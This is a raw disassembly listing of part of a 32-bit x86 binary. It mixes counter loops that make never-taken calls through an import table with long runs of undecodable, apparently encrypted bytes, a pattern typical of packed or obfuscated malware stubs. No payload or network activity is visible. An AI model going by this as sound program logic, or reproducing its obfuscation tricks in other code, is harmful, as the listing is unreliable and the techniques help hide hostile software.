  403219:	jns    0x4031b8
  40321b:	ss int3 
  40321d:	test   ebp,ecx
  40321f:	adc    DWORD PTR [edx-0x3ec29ae9],edx
  403225:	mov    esi,0x34dacab
  40322a:	aad    0xaf
  40322c:	(bad)  
  40322d:	ficom  DWORD PTR ds:0x7e4ddf29
  403233:	repz loopne 0x403257
  403236:	shr    edx,cl
  403238:	inc    esp
  403239:	mov    cs,WORD PTR [edi+0x3a520fcf]
  40323f:	jg     0x4031d3
  403241:	jbe    0x4031dd
  403243:	fist   DWORD PTR [ebp-0x53d3b935]
  403249:	pop    edi
  40324a:	pop    esi
  40324b:	leave  
  40324c:	ret    0xc
  40324f:	push   ebp
  403250:	mov    ebp,esp
  403252:	mov    eax,ds:0x444224
  403257:	add    DWORD PTR ds:0x447998,edx
  40325d:	mov    edx,0x32729e
  403262:	movzx  ecx,WORD PTR ds:0x424861
  403269:	or     DWORD PTR ds:0x44d40c,ecx
  40326f:	sub    eax,edx
  403271:	mov    ecx,DWORD PTR ds:0x44d41c
  403277:	or     DWORD PTR ds:0x44799c,ecx
  40327d:	mov    ecx,0x7510857
  403282:	and    DWORD PTR ds:0x44a6d0,0x4479a8
  40328c:	push   esi
  40328d:	and    DWORD PTR ds:0x41074b,0x0
  403297:	jmp    0x4032a9
  40329c:	mov    esi,DWORD PTR ds:0x41074b
  4032a2:	inc    esi
  4032a3:	mov    DWORD PTR ds:0x41074b,esi
  4032a9:	cmp    DWORD PTR ds:0x41074b,0x18
  4032b0:	jae    0x4032e1
  4032b6:	cmp    DWORD PTR ds:0x41074b,0x24
  4032bd:	jne    0x4032dc
  4032c3:	push   0x2dca
  4032c8:	push   0x41089f
  4032cd:	push   DWORD PTR [ebp-0x18]
  4032d0:	push   DWORD PTR [ebp-0x18]
  4032d3:	push   DWORD PTR [ebp-0x10]
  4032d6:	call   DWORD PTR ds:0x442004
  4032dc:	jmp    0x40329c
  4032e1:	mov    esi,DWORD PTR [ebp+0xc]
  4032e4:	add    DWORD PTR ds:0x447980,0x447994
  4032ee:	xor    eax,ecx
  4032f0:	cmp    eax,esi
  4032f2:	je     0x403532
  4032f8:	mov    eax,ds:0x44421c
  4032fd:	xor    DWORD PTR ds:0x44d428,0x43cf
  403307:	jmp    0x4033ac
  40330c:	rol    BYTE PTR ds:0xad798db9,1
  403312:	loopne 0x403391
  403314:	dec    esi
  403315:	push   edi
  403316:	mov    cl,0x6e
  403318:	inc    esp
  403319:	cmc    
  40331a:	push   ecx
  40331b:	int    0xee
  40331d:	add    bh,BYTE PTR [esp+edi*2-0xc]
  403321:	jl     0x40339f
  403323:	jl     0x403320
  403325:	sub    BYTE PTR ds:0xfad1831c,ah
  40332b:	mov    ds:0x2406a436,al
  403330:	jo     0x403365
  403332:	into   
  403333:	jnp    0x403306
  403335:	jno    0x403360
  403337:	or     DWORD PTR [ebp-0x7b],ebx
  40333a:	dec    ebx
  40333b:	loope  0x403380
  40333d:	hlt    
  40333e:	and    al,0xf1
  403340:	pop    bx
  403342:	rcl    BYTE PTR [esi+0x32],1
  403345:	jne    0x40330a
  403347:	es jno 0x403390
  40334a:	push   eax
  40334b:	mov    BYTE PTR gs:0xc0f4fd00,bl
  403352:	jae    0x4032d8
  403354:	pusha  
  403355:	into   
  403356:	xchg   ebx,eax
  403357:	fsubr  QWORD PTR [ebx-0x6548656b]
  40335d:	mov    ah,ch
  40335f:	in     eax,0x9d
  403361:	inc    ebx
  403362:	jns    0x403358
  403364:	adc    al,0xd7
  403366:	push   ss
  403367:	ss sbb edx,esi
  40336a:	stos   BYTE PTR es:[edi],al
  40336b:	add    dh,ah
  40336d:	inc    esp
  40336e:	mov    al,0xb
  403370:	dec    esi
  403371:	xor    DWORD PTR [ebx+0x5ee00b86],ebx
  403377:	stos   DWORD PTR es:[edi],eax
  403378:	sub    al,BYTE PTR [edi+0x62bd0c67]
  40337e:	mov    ebx,0x2d3e7c44
  403383:	cmp    ebx,edx
  403385:	in     eax,dx
  403386:	out    0x9e,eax
  403388:	cli    
  403389:	sti    
  40338a:	push   0x1f
  40338c:	mov    eax,DWORD PTR [esi+0x2cdf7ecd]
  403392:	inc    ebx
  403393:	stos   BYTE PTR es:[edi],al
  403394:	popa   
  403395:	push   eax
  403396:	addr16 jmp 0x40338f
  403399:	pop    esp
  40339a:	sbb    bh,BYTE PTR [ecx]
  40339c:	jne    0x4033cf
  40339e:	in     eax,dx
  40339f:	sbb    BYTE PTR [ebx+0x5a27d71c],bh
  4033a5:	add    esp,DWORD PTR [edi]
  4033a7:	mov    ds,WORD PTR ds:0x8becbb11
  4033ad:	jne    0x4033bb
  4033af:	sub    eax,edx
  4033b1:	jmp    0x403456
  4033b6:	sahf   
  4033b7:	and    al,0xc4
  4033b9:	cwde   
  4033ba:	inc    esi
  4033bb:	js     0x40340f
  4033bd:	cmp    dl,BYTE PTR [eax+0x4a]
  4033c0:	fucomp st(0)
  4033c2:	lock jno 0x403431
  4033c5:	mov    eax,0x7c7c0266
  4033ca:	hlt    
  4033cb:	jl     0x403449
  4033cd:	jl     0x4033a9
  4033cf:	cmp    eax,0x2e720f34
  4033d4:	inc    DWORD PTR [edx]
  4033d6:	mov    bh,0x10
  4033d8:	ja     0x4033a8
  4033da:	add    al,0xfb
  4033dc:	xchg   BYTE PTR [ebx+0x3],cl
  4033df:	stc    
  4033e0:	or     eax,0x10433872
  4033e5:	and    BYTE PTR [edi+0x62edff07],dh
  4033eb:	or     ch,dl
  4033ed:	out    dx,eax
  4033ee:	xchg   esp,eax
  4033ef:	fbstp  TBYTE PTR [esi+0x12d8eded]
  4033f5:	add    eax,0xcb35eb76
  4033fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033fb:	dec    eax
  4033fc:	push   ecx
  4033fd:	ffree  st(2)
  4033ff:	popa   
  403400:	pop    ss
  403401:	fwait
  403402:	mov    bl,0x3
  403404:	das    
  403405:	and    DWORD PTR [edx],ebx
  403407:	push   eax
  403408:	leave  
  403409:	stos   BYTE PTR es:[edi],al
  40340a:	push   esi
  40340b:	mov    DWORD PTR [eax-0x40a5fdc4],ecx
  403411:	call   0x5bfd:0x2afb1778
  403418:	stos   BYTE PTR es:[edi],al
  403419:	pop    bp
  40341b:	dec    edx
  40341c:	jae    0x4033f2
  40341e:	popa   
  40341f:	xor    edx,DWORD PTR [edi-0x2dc007d8]
  403425:	aad    0x8d
  403427:	sub    BYTE PTR [ecx+eax*8-0x7],dh
  40342b:	push   edx
  40342c:	sbb    al,0x6d
  40342e:	pop    ds
  40342f:	dec    edi
  403430:	and    eax,edi
  403432:	lock push ebx
  403434:	xchg   BYTE PTR [ebp-0x6a41d3e1],ah
  40343a:	loopne 0x4033d6
  40343c:	jl     0x4034a6
  40343e:	loopne 0x403474
  403440:	in     eax,0xe7
  403442:	add    DWORD PTR [edi+eax*8-0xb],edi
  403446:	push   eax
  403447:	push   ebp
  403448:	mov    ss,WORD PTR [edx+ebp*2+0x43]
  40344c:	pop    ds
  40344d:	fnstcw WORD PTR [edx-0x3f]
  403450:	mov    dh,0x6c
  403452:	inc    eax
  403453:	fld    DWORD PTR [eax]
  403455:	jno    0x40348a
  403457:	sar    DWORD PTR [ebx],0xc6
  40345a:	jne    0x403470
  403460:	mov    eax,ds:0x444224
  403465:	add    eax,DWORD PTR ds:0x44421c
  40346b:	jmp    0x40351c
  403470:	mov    eax,DWORD PTR [ebp+0xc]
  403473:	xor    eax,ecx
  403475:	jmp    0x40351a
  40347a:	ficomp WORD PTR [edx+0x22]
  40347d:	mov    WORD PTR [edx+0x277a5264],?
  403483:	adc    eax,0x1f4afc0e
  403488:	cmc    
  403489:	sar    dh,0x5
  40348c:	jl     0x40350a
  40348e:	hlt    
  40348f:	jl     0x40350d
  403491:	jl     0x403485
  403493:	in     al,dx
  403494:	or     esp,esi
  403496:	leave  
  403497:	pop    esi
  403498:	pop    ecx
  403499:	nop
  40349a:	outs   dx,DWORD PTR ds:[esi]
  40349b:	fwait
  40349c:	or     eax,0xc35b12e3
  4034a1:	fdiv   QWORD PTR [ecx+0x673da1d8]
  4034a7:	mov    al,ds:0x67dd35ab
  4034ac:	mov    eax,DWORD PTR [ecx]
  4034ae:	xchg   ebp,eax
  4034af:	loop   0x40345f
  4034b1:	outs   dx,BYTE PTR ds:[esi]
  4034b2:	mov    ah,0x7e
  4034b4:	add    bl,BYTE PTR [eax-0x7ad3f8cb]
  4034ba:	in     eax,dx
  4034bb:	loopne 0x4034d8
  4034bd:	sar    DWORD PTR ds:0x90231bde,0x3c
  4034c4:	inc    esi
  4034c5:	cwde   
  4034c6:	outs   dx,BYTE PTR ds:[esi]
  4034c7:	jae    0x403472
  4034c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034ca:	in     eax,0x2f
  4034cc:	inc    esp
  4034cd:	mov    ecx,0xf23558f0
  4034d2:	inc    esp
  4034d3:	cli    
  4034d4:	arpl   WORD PTR [ecx],cx
  4034d6:	xchg   esi,eax
  4034d7:	inc    edx
  4034d8:	imul   esi,DWORD PTR [ebp+0x508c60b5],0xa76180c4
  4034e2:	jbe    0x403517
  4034e4:	sub    eax,0xe2983d05
  4034e9:	jns    0x403537
  4034eb:	mov    ch,0x4e
  4034ed:	sub    al,0x41
  4034ef:	jg     0x4034c4
  4034f1:	imul   ecx,DWORD PTR [esi-0x628fd6b0],0xd2c90cf5
  4034fb:	aas    
  4034fc:	clc    
  4034fd:	jge    0x403528
  4034ff:	loope  0x40353e
  403501:	dec    eax
  403502:	sti    
  403503:	jbe    0x4034cf
  403505:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403506:	jae    0x40354d
  403508:	popf   
  403509:	aam    0x55
  40350b:	inc    edx
  40350c:	repnz (bad) 
  40350e:	inc    BYTE PTR [edi-0x6a]
  403511:	adc    eax,0xead0f203
  403516:	sub    al,BYTE PTR [edx+0x28]
  403519:	jmp    0x4442:0x1ca3c203
  403520:	add    BYTE PTR [ebx-0x3eccf3bb],cl
  403526:	add    eax,edx
  403528:	mov    ds:0x444224,eax
  40352d:	jmp    0x40353c
  403532:	mov    eax,ds:0x444224
  403537:	mov    ds:0x44421c,eax
  40353c:	mov    eax,DWORD PTR [ebp+0x8]
  40353f:	mov    eax,DWORD PTR [eax]
  403541:	mov    ecx,DWORD PTR ds:0x44421c
  403547:	add    DWORD PTR [eax],ecx
  403549:	pop    esi
  40354a:	pop    ebp
  40354b:	ret    0x8
  40354e:	push   ebp
  40354f:	mov    ebp,esp
  403551:	sub    esp,0x44
  403554:	push   edi
  403555:	mov    eax,DWORD PTR [ebp+0xc]
  403558:	and    edi,DWORD PTR ds:0x447984
  40355e:	mov    DWORD PTR [ebp-0x10],eax
  403561:	mov    DWORD PTR ds:0x44d424,0x11
  40356b:	cmp    DWORD PTR ds:0x44d424,0x0
  403572:	je     0x4035af
  403578:	cmp    DWORD PTR ds:0x44d424,0x1d
  40357f:	jne    0x403595
  403585:	push   0x4107d0
  40358a:	push   0x4107e6
  40358f:	call   DWORD PTR ds:0x44234c
  403595:	mov    eax,ds:0x44d424
  40359a:	dec    eax
  40359b:	mov    ds:0x44d424,eax
  4035a0:	jmp    0x40356b
  4035a5:	xor    DWORD PTR ds:0x44a6dc,0x5830
  4035af:	mov    eax,DWORD PTR [ebp+0x8]
  4035b2:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4035b9:	mov    edi,DWORD PTR ds:0x44a6d0
  4035bf:	xor    DWORD PTR ds:0x44a6e0,edi
  4035c5:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  4035cc:	xor    edx,DWORD PTR ds:0x424851
  4035d2:	mov    edx,DWORD PTR [ebp+0x8]
  4035d5:	and    edi,edi
  4035d7:	jmp    0x40373c
  4035dc:	loopne 0x4035cc
  4035de:	enter  0xcaef,0xfd
  4035e2:	sti    
  4035e3:	in     eax,0xa8
  4035e5:	cmp    eax,edi
  4035e7:	jg     0x403659
  4035e9:	inc    ecx
  4035ea:	inc    edi
  4035eb:	fidiv  WORD PTR [esi+0x4]
  4035ee:	jl     0x40366c
  4035f0:	xor    al,0x7f
  4035f2:	jl     0x403670
  4035f4:	push   ss
  4035f5:	fs std 
  4035f7:	add    BYTE PTR [ecx-0x71cacab8],bh
  4035fd:	push   es
  4035fe:	dec    edx
  4035ff:	cmp    ch,BYTE PTR [edi-0x63]
  403602:	push   ss
  403603:	push   ebp
  403604:	fldenv [ebp+0x6f6e8f07]
  40360a:	test   esi,esp
  40360c:	lods   eax,DWORD PTR ds:[esi]
  40360d:	mov    esi,0xb2900160
  403612:	in     eax,dx
  403613:	push   edx
  403614:	and    eax,0xdaea7e9c
  403619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40361a:	push   0xb8d1451c
  40361f:	push   edi
  403620:	mov    esi,0x9d6d0b1e
  403625:	pop    ebx
  403626:	dec    edx
  403627:	adc    BYTE PTR [ecx+0x3],al
  40362a:	and    cl,BYTE PTR [esi+0x1a]
  40362d:	dec    esp
  40362e:	or     DWORD PTR [esi-0x6e02b5a9],0x41
  403635:	xchg   DWORD PTR [esi-0x6d665964],edx
  40363b:	je     0x40366f
  40363d:	imul   ecx,DWORD PTR [ebp+0x38],0xdd458e87
  403644:	xlat   BYTE PTR ds:[ebx]
  403645:	jle    0x403672
  403647:	sub    ebp,edi
  403649:	or     eax,0xe6ae2675
  40364e:	pop    edx
  40364f:	sub    BYTE PTR [ecx+0x61],dh
  403652:	pop    es
  403653:	data16 fbld TBYTE PTR [edi+0x3a]
  403657:	fisubr DWORD PTR [ebx-0x40]
  40365a:	sub    ch,BYTE PTR [eax-0x6]
  40365d:	xchg   ebp,eax
  40365e:	call   FWORD PTR [esi]
  403660:	enter  0x3f,0x70
  403664:	and    al,0xa
  403666:	je     0x403630
  403668:	fwait
  403669:	imul   bh
  40366b:	lods   al,BYTE PTR ds:[esi]
  40366c:	lea    esi,[esi+eax*8-0x77fbf17d]
  403673:	add    bl,bh
  403675:	lock pop ecx
  403677:	loopne 0x403651
  403679:	mov    BYTE PTR [edi+0x248e4bb6],cl
  40367f:	(bad)  
  403680:	push   0x75
  403682:	(bad)  
  403683:	dec    ebp
  403684:	ja     0x403639
  403686:	mov    edx,0x97d75086
  40368b:	aam    0x84
  40368d:	pop    esi
  40368e:	dec    dx
  403690:	pop    ebx
  403691:	xchg   esp,ecx
  403693:	pop    ebp
  403694:	jl     0x403667
  403696:	mov    dh,0xfc
  403698:	sbb    cl,BYTE PTR [ebx-0x27]
  40369b:	xchg   BYTE PTR [ebx-0x444066d1],dh
  4036a1:	push   eax
  4036a2:	and    BYTE PTR [edx-0x69],dl
  4036a5:	inc    esp
  4036a6:	mov    al,0x87
  4036a8:	mov    eax,ds:0xa5284a3c
  4036ad:	int    0x50
  4036af:	retf   0x85e0
  4036b2:	or     ebp,edx
  4036b4:	and    eax,0xe101c448
  4036b9:	or     al,0x6d
  4036bb:	or     BYTE PTR [ecx+0x7a],bl
  4036be:	sub    eax,0xdfcd9a0f
  4036c3:	and    dh,ah
  4036c5:	dec    esp
  4036c6:	jnp    0x403668
  4036c8:	cbw    
  4036ca:	mov    ebx,0x7312ec40
  4036cf:	adc    eax,0xe6c41564
  4036d4:	stos   BYTE PTR es:[edi],al
  4036d5:	mov    ds:0xc6c5ae2e,eax
  4036da:	out    0x4c,al
  4036dc:	jp     0x4036a6
  4036de:	scas   eax,DWORD PTR es:[edi]
  4036df:	cmp    BYTE PTR [eax-0x5f72ad6b],dl
  4036e5:	cmp    bh,bl
  4036e7:	test   eax,0x984dec12
  4036ec:	jmp    0x403704
  4036ee:	push   ss
  4036ef:	jae    0x4036c7
  4036f1:	jo     0x403766
  4036f3:	cdq    
  4036f4:	mov    esi,0xb2396460
  4036f9:	pop    esp
  4036fa:	in     al,dx
  4036fb:	(bad)  
  4036fc:	and    ah,BYTE PTR [ebp-0x6c199d8]
  403702:	jno    0x40370a
  403704:	imul   eax,DWORD PTR [ecx+edx*4],0x73212d14
  40370b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40370c:	dec    esi
  40370d:	pushf  
  40370e:	enter  0xc6b9,0xb2
  403712:	mov    edi,0x2fe0e306
  403717:	inc    eax
  403718:	sbb    eax,ecx
  40371a:	cmp    ch,BYTE PTR [eax-0x2d]
  40371d:	call   0xb05c:0xd516bb10
  403724:	aad    0xd9
  403726:	mov    ebp,0x9ec85785
  40372b:	call   0x8098:0xb8cafdfa
  403732:	mov    ebp,0xcffc4ad8
  403737:	pop    ecx
  403738:	cmc    
  403739:	and    eax,0x4589d2f6
  40373e:	sar    BYTE PTR [eax+0x7510857],0x33
  403745:	sar    BYTE PTR [ecx+0x32729e],1
  40374b:	add    edx,ecx
  40374d:	adc    edi,DWORD PTR ds:0x447990
  403753:	mov    DWORD PTR [ebp-0x8],edx
  403756:	mov    edi,DWORD PTR ds:0x4479bc
  40375c:	mov    edx,DWORD PTR ds:0x4479c4
  403762:	sub    edx,edi
  403764:	xor    edi,DWORD PTR [edi+edx*1]
  403767:	mov    edx,DWORD PTR [ebp+0x8]
  40376a:	xor    edx,eax
  40376c:	not    edi
  40376e:	add    edx,ecx
  403770:	add    DWORD PTR ds:0x447984,ebx
  403776:	mov    DWORD PTR [ebp+0xc],edx
  403779:	and    DWORD PTR ds:0x424851,0x0
  403783:	mov    edx,DWORD PTR ds:0x424851
  403789:	inc    edx
  40378a:	mov    DWORD PTR ds:0x424851,edx
  403790:	cmp    DWORD PTR ds:0x424851,0x4
  403797:	jne    0x4037b0
  40379d:	push   0x41073f
  4037a2:	push   DWORD PTR [ebp-0x28]
  4037a5:	push   0x6880
  4037aa:	call   DWORD PTR ds:0x442350
  4037b0:	cmp    DWORD PTR ds:0x424851,0x3
  4037b7:	jne    0x4037cc
  4037bd:	xor    edx,edx
  4037bf:	xor    edx,DWORD PTR ds:0x424851
  4037c5:	inc    edx
  4037c6:	mov    DWORD PTR ds:0x424851,edx
  4037cc:	cmp    DWORD PTR ds:0x424851,0x1b
  4037d3:	jb     0x403783
  4037d9:	adc    edi,DWORD PTR ds:0x44a6cc
  4037df:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  4037e6:	adc    edi,DWORD PTR ds:0x4479a4
  4037ec:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4037f3:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  4037fa:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  403801:	and    DWORD PTR ds:0x424855,0x0
  40380b:	jmp    0x40381d
  403810:	mov    edx,DWORD PTR ds:0x424855
  403816:	inc    edx
  403817:	mov    DWORD PTR ds:0x424855,edx
  40381d:	cmp    DWORD PTR ds:0x424855,0x1e
  403824:	jae    0x40386c
  40382a:	cmp    DWORD PTR ds:0x424855,0xa
  403831:	jne    0x403847
  403837:	push   0x48af
  40383c:	push   0x400000
  403841:	call   DWORD PTR ds:0x442354
  403847:	cmp    DWORD PTR ds:0x424855,0x9
  40384e:	jne    0x403861
  403854:	mov    edx,DWORD PTR ds:0x424855
  40385a:	inc    edx
  40385b:	mov    DWORD PTR ds:0x424855,edx
  403861:	jmp    0x403810
  403866:	or     DWORD PTR ds:0x447994,ecx
  40386c:	mov    DWORD PTR [ebp-0x34],0xf89c8530
  403873:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40387a:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  403881:	or     edi,edx
  403883:	mov    edx,DWORD PTR [ebp+0x8]
  403886:	mov    DWORD PTR ds:0x424865,0x6ab7
  403890:	xor    edx,eax
  403892:	or     DWORD PTR ds:0x41075b,edx
  403898:	mov    edi,DWORD PTR [ebp-0x10]
  40389b:	add    edx,ecx
  40389d:	cmp    edi,edx
  40389f:	mov    DWORD PTR ds:0x447980,0x7f1d
  4038a9:	je     0x40511b
  4038af:	mov    DWORD PTR ds:0x424851,0x4e02
  4038b9:	push   ebx
  4038ba:	mov    DWORD PTR ds:0x44a6cc,0x557d
  4038c4:	jmp    0x4050f6
  4038c9:	mov    edx,DWORD PTR [ebp-0x8]
  4038cc:	and    DWORD PTR ds:0x44d41c,0x0
  4038d6:	jmp    0x4038e8
  4038db:	mov    edi,DWORD PTR ds:0x44d41c
  4038e1:	inc    edi
  4038e2:	mov    DWORD PTR ds:0x44d41c,edi
  4038e8:	cmp    DWORD PTR ds:0x44d41c,0x10
  4038ef:	jae    0x403921
  4038f5:	cmp    DWORD PTR ds:0x44d41c,0x19
  4038fc:	jne    0x403912
  403902:	push   0x7f28
  403907:	push   0x230d
  40390c:	call   DWORD PTR ds:0x442358
  403912:	jmp    0x4038db
  403917:	mov    DWORD PTR ds:0x447984,0x3377
  403921:	mov    edi,DWORD PTR [ebp-0x10]
  403924:	or     DWORD PTR ds:0x44a6e4,0x66ab
  40392e:	jmp    0x403a93
  403933:	std    
  403934:	xor    al,0x25
  403936:	mov    eax,ds:0x487d7d25
  40393b:	add    al,0x98
  40393d:	test   al,0x7f
  40393f:	das    
  403940:	jne    0x4039b0
  403942:	(bad)  
  403943:	into   
  403944:	pop    es
  403945:	jl     0x4039c3
  403947:	xor    al,0x7f
  403949:	jl     0x4039c7
  40394b:	xor    eax,0xf72e0187
  403950:	pop    edx
  403951:	adc    bh,BYTE PTR [edx+0x11]
  403954:	adc    eax,0xd65145a4
  403959:	fmul   QWORD PTR [eax]
  40395b:	pop    edx
  40395c:	es mov ebx,0xcefa8ee0
  403962:	jbe    0x403916
  403964:	sub    bh,BYTE PTR [ecx+eax*8]
  403967:	adc    BYTE PTR [ebp+0x5429c9e0],al
  40396d:	pop    ds
  40396e:	jmp    ebp
  403970:	loopne 0x40393c
  403972:	adc    eax,0xff890923
  403977:	mov    bh,0xeb
  403979:	ret    0x41fa
  40397c:	push   ecx
  40397d:	jge    0x4039e5
  40397f:	xchg   esi,eax
  403980:	int    0x5e
  403982:	adc    ah,BYTE PTR [esi-0x48da0a45]
  403988:	les    ebp,FWORD PTR [edi-0x51]
  40398b:	retf   0x71d1
  40398e:	enter  0x1064,0x86
  403992:	int    0xca
  403994:	push   0x5e4a1dc
  403999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40399a:	cmc    
  40399b:	sub    ebp,DWORD PTR [edi+0x758e8c97]
  4039a1:	and    ch,BYTE PTR [eax]
  4039a3:	pop    esp
  4039a4:	int3   
  4039a5:	fst    DWORD PTR [di+0xc]
  4039a9:	and    ah,BYTE PTR [edi]
  4039ab:	outs   dx,DWORD PTR ds:[esi]
  4039ac:	inc    edx
  4039ad:	(bad)  
  4039ae:	jnp    0x4039a3
  4039b0:	xchg   BYTE PTR [eax+0x33],ch
  4039b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039b4:	hlt    
  4039b5:	adc    sp,ax
  4039b8:	ror    BYTE PTR [esi-0x5fdccebf],cl
  4039be:	pop    esp
  4039bf:	sub    al,0xd8
  4039c1:	and    ah,BYTE PTR [ebp+0x166844ab]
  4039c7:	paddusb mm1,QWORD PTR [ebx+0x3cdbbd14]
  4039ce:	into   
  4039cf:	mul    bl
  4039d1:	fld    DWORD PTR [ebx+0x324162d7]
  4039d7:	shl    DWORD PTR [ebx+0x2207a6f1],0xd6
  4039de:	(bad)  
  4039df:	ficomp DWORD PTR [eax+edi*4+0x17d94853]
  4039e6:	xchg   esi,eax
  4039e7:	inc    ebx
  4039e8:	icebp  
  4039e9:	fnstcw WORD PTR [edi+esi*1]
  4039ec:	sbb    edx,esi
  4039ee:	mov    esi,0x35e914e2
  4039f3:	les    esp,FWORD PTR [edx+0x64]
  4039f6:	mov    bl,0x96
  4039f8:	push   ebx
  4039f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039fa:	rol    BYTE PTR [eax],0x39
  4039fd:	inc    ebx
  4039fe:	pop    ebx
  4039ff:	xor    ebp,edx
  403a01:	sbb    al,0xd0
  403a03:	fild   WORD PTR [ebp+0x24]
  403a06:	int    0x1e
  403a08:	pop    esp
  403a09:	push   0xffffffd7
  403a0b:	mov    bl,0x45
  403a0d:	pop    ebx
  403a0e:	push   ecx
  403a0f:	cmp    eax,0x36917657
  403a14:	sbb    dl,BYTE PTR [ecx+0x51d45e5]
  403a1a:	stc    
  403a1b:	fld    st(7)
  403a1d:	add    DWORD PTR cs:[edx],edx
  403a20:	mov    ch,0xe3
  403a22:	jns    0x4039b1
  403a24:	jl     0x403a00
  403a26:	lock out dx,al
  403a28:	dec    ebx
  403a29:	jae    0x4039d3
  403a2b:	call   0x2fa7:0x2d955f9e
  403a32:	mov    eax,0x8d37bec8
  403a37:	push   ss
  403a38:	retf   0x8ded
  403a3b:	hlt    
  403a3c:	add    DWORD PTR [edx],ebx
  403a3e:	ss dec ecx
  403a40:	out    dx,al
  403a41:	sub    dh,0x3d
  403a44:	out    dx,eax
  403a45:	(bad)  
  403a46:	adc    BYTE PTR [edx-0x27def037],dl
  403a4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a4d:	cmp    eax,0xe6cfb201
  403a52:	sar    esp,1
  403a54:	add    dh,BYTE PTR [esi-0x4c]
  403a57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a58:	add    DWORD PTR [ecx+0x79],ebx
  403a5b:	lock adc BYTE PTR [esi+0x5ee04f6e],al
  403a62:	out    0xdc,al
  403a64:	push   ebx
  403a65:	sbb    BYTE PTR [edi],0xcf
  403a68:	dec    esi
  403a69:	add    eax,edx
  403a6b:	jno    0x403a76
  403a6d:	pop    esi
  403a6e:	pop    es
  403a6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a70:	ret    
  403a71:	xchg   ebp,eax
  403a72:	and    bl,BYTE PTR [esi+0x3b9f8e38]
  403a78:	sbb    ebx,DWORD PTR [eax]
  403a7a:	ficomp WORD PTR [edi+0x12aaddad]
  403a80:	jns    0x403af9
  403a82:	xor    DWORD PTR [esp+ebx*8-0x47292a1a],esi
  403a89:	cmp    ch,dl
  403a8b:	mov    edx,0xedb34b29
  403a90:	mov    ecx,0xfa2b3893
  403a95:	adc    DWORD PTR ds:0x44d410,0x1ab0
  403a9f:	mov    edx,DWORD PTR [ebp-0x4]
  403aa2:	xor    DWORD PTR ds:0x44a6e4,0x35da
  403aac:	xor    edx,eax
  403aae:	xor    DWORD PTR ds:0x44a6e8,0x513b
  403ab8:	add    edx,ecx
  403aba:	mov    DWORD PTR ds:0x44d414,0x7aea
  403ac4:	cmp    edi,edx
  403ac6:	mov    DWORD PTR ds:0x41073f,0x2e05
  403ad0:	jb     0x40511a
  403ad6:	xor    edx,0x3e56
  403adc:	mov    edx,DWORD PTR [ebp-0x28]
  403adf:	mov    edi,DWORD PTR [ebp-0x4]
  403ae2:	xor    edx,eax
  403ae4:	and    DWORD PTR ds:0x447980,0x0
  403aee:	jmp    0x403b02
  403af3:	xor    ebx,ebx
  403af5:	xor    ebx,DWORD PTR ds:0x447980
  403afb:	inc    ebx
  403afc:	mov    DWORD PTR ds:0x447980,ebx
  403b02:	cmp    DWORD PTR ds:0x447980,0x16
  403b09:	jae    0x403b9b
  403b0f:	cmp    DWORD PTR ds:0x447980,0xd
  403b16:	jne    0x403b25
  403b1c:	push   DWORD PTR [ebp-0x18]
  403b1f:	call   DWORD PTR ds:0x442008
  403b25:	cmp    DWORD PTR ds:0x447980,0xc
  403b2c:	jne    0x403b41
  403b32:	xor    ebx,ebx
  403b34:	xor    ebx,DWORD PTR ds:0x447980
  403b3a:	inc    ebx
  403b3b:	mov    DWORD PTR ds:0x447980,ebx
  403b41:	jmp    0x403af3
  403b46:	and    DWORD PTR ds:0x447980,0x0
  403b50:	jmp    0x403b64
  403b55:	xor    ebx,ebx
  403b57:	add    ebx,DWORD PTR ds:0x447980
  403b5d:	inc    ebx
  403b5e:	mov    DWORD PTR ds:0x447980,ebx
  403b64:	cmp    DWORD PTR ds:0x447980,0x19
  403b6b:	jae    0x403b9b
  403b71:	cmp    DWORD PTR ds:0x447980,0x1e
  403b78:	jne    0x403b96
  403b7e:	push   DWORD PTR [ebp-0x1c]
  403b81:	push   0x4801
  403b86:	push   0x66a1
  403b8b:	push   0x3965
  403b90:	call   DWORD PTR ds:0x4420d4
  403b96:	jmp    0x403b55
  403b9b:	xor    edi,eax
  403b9d:	mov    ebx,DWORD PTR ds:0x4479ac
  403ba3:	mov    ebx,DWORD PTR [ebx]
  403ba5:	sbb    DWORD PTR ds:0x424849,ebx
  403bab:	add    edi,ecx
  403bad:	jmp    0x403d12
  403bb2:	jno    0x403b37
  403bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bb5:	imul   esp,DWORD PTR [ebp+0x727dd96d],0x2a
  403bbc:	pop    esi
  403bbd:	clc    
  403bbe:	adc    BYTE PTR [esi-0x6b],bl
  403bc1:	cmp    eax,DWORD PTR [esi+0x347c7c06]
  403bc7:	jg     0x403c45
  403bc9:	jl     0x403c48
  403bcb:	sbb    DWORD PTR [edi-0x7e7c9a2e],edx
  403bd1:	retf   
  403bd2:	fiadd  WORD PTR [edi-0x1b01b948]
  403bd8:	pop    ecx
  403bd9:	dec    eax
  403bda:	imul   esp,DWORD PTR [eax+0x24],0x7dfe968d
  403be1:	cld    
  403be2:	pushf  
  403be3:	and    eax,0x744813f2
  403be8:	jo     0x403bf1
  403bea:	test   bl,dh
  403bec:	test   BYTE PTR [esi],al
  403bee:	(bad)  
  403bef:	xor    eax,0x927d3be1
  403bf4:	xor    dl,bh
  403bf6:	imul   ebx,DWORD PTR [eax],0x12bf75bf
  403bfc:	or     DWORD PTR [eax-0x775725],edi
  403c02:	xor    BYTE PTR [esi],al
  403c04:	xor    BYTE PTR [edi],cl
